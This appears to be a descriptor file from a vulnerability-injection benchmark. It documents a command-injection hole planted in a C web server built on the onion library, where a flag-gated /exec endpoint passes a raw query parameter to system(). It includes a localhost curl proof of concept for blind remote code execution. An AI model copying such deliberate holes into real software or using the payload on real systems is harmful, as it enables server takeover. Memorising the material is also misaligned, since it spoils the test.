SOURCE:      /home/ubuntu/anthropic/corpus/onion/
BASE_FILE:   server.c  (in corpus onion directory)
AXES:        C1 I3 S1

DESCRIPTION:
  CLI-flag-gated command injection. The server must be started with --exec-mode
  for the vulnerable /exec endpoint to be reachable. A user-supplied URL query
  parameter flows through a struct-based dispatch table and then directly into
  system() with no sanitization.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard at top of exec_handler():
              `if (!exec_mode) { return 404; }`
  complexity: one condition, one flag, no struct, no file parsing

INPUT_FLOW (I3 — struct dispatch then system()):
  entry:      HTTP GET /exec?cmd=<payload>  →  onion_request_get_query(req, "cmd")
  path:       exec_handler() reads cmd query param; walks cmd_table[] struct array
              to find a matching prefix; sets dispatch_cmd = cmd (the raw input);
              falls back to cmd even for unrecognised prefixes; calls system(dispatch_cmd)
  transforms: none — cmd pointer set from raw query string, no copy before system()

SANITIZATION (S1 — none):
  none — system() receives the raw query parameter value directly

SINK:        system(dispatch_cmd) in exec_handler() (server.c)

CHANGED FILES:
  server.c — 3 hunks:
    1. cmd_entry struct + cmd_table[]:  dispatch table added after g_onion global
    2. exec_handler() comment line:     updated to reflect C1 I3 S1 axes
    3. exec_handler() body:             replaced NOT_IMPLEMENTED stub with struct
                                        dispatch loop, fallback, and system() sink

EXPLOIT:
  build:   bash build.sh
  start:   ./onion_server --port 18093 --exec-mode
  trigger: curl 'http://127.0.0.1:18093/exec?cmd=id>/tmp/poc_093_marker'
  verify:  cat /tmp/poc_093_marker
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes exec_handler() to return 404 immediately.

NOTES:
  - system() output goes to the server's inherited stdout/stderr, not the HTTP
    response body. Use a write-to-file payload (id>/tmp/file) for blind RCE verification.
  - The dispatch table prefix match is not a sanitization: all paths converge on
    system(cmd) with the original, unmodified query string including any shell
    metacharacters (;, |, &, backtick, $(), etc.).
  - Onion library location: /home/ubuntu/anthropic/corpus/onion/build/src/onion/
    The binary embeds the rpath so it runs without LD_LIBRARY_PATH.
